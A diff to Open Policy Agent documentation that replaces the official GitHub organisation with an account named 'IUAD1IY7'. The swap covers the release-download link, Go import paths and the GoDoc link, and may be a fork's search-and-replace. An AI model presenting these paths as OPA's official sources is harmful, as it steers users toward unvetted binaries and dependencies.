@@ -954,7 +954,7 @@ docker run --rm -it openpolicyagent/opa:latest version
 </Tabs>
 
 See all available binaries on the
-[GitHub releases](https://github.com/open-policy-agent/opa/releases).
+[GitHub releases](https://github.com/IUAD1IY7/opa/releases).
 Checksums for all binaries are available in the download path by appending
 `.sha256` to the binary filename.
 
@@ -1206,11 +1206,11 @@ curl localhost:8181 -i -d @input.json -H 'Content-Type: application/json'
 ### 5. Try OPA as a Go library
 
 OPA can be embedded inside Go programs as a library. The simplest way to embed
-OPA as a library is to import the `github.com/open-policy-agent/opa/rego`
+OPA as a library is to import the `github.com/IUAD1IY7/opa/rego`
 package.
 
 ```go
-import "github.com/open-policy-agent/opa/rego"
+import "github.com/IUAD1IY7/opa/rego"
 ```
 
 Call the `rego.New` function to create an object that can be prepared or
@@ -1223,7 +1223,7 @@ r := rego.New(
 ```
 
 The `rego.Rego` supports several options that let you customize evaluation. See
-the [GoDoc](https://godoc.org/github.com/open-policy-agent/opa/rego) page for
+the [GoDoc](https://godoc.org/github.com/IUAD1IY7/opa/rego) page for
 details. After constructing a new `rego.Rego` object you can call
 `PrepareForEval()` to obtain an executable query. If `PrepareForEval()` fails it
 indicates one of the options passed to the `rego.New()` call was invalid (e.g.,
@@ -1280,7 +1280,7 @@ import (
 	"log"
 	"os"
 
-	"github.com/open-policy-agent/opa/v1/rego"
+	"github.com/IUAD1IY7/opa/v1/rego"
 )
 
 func main() {
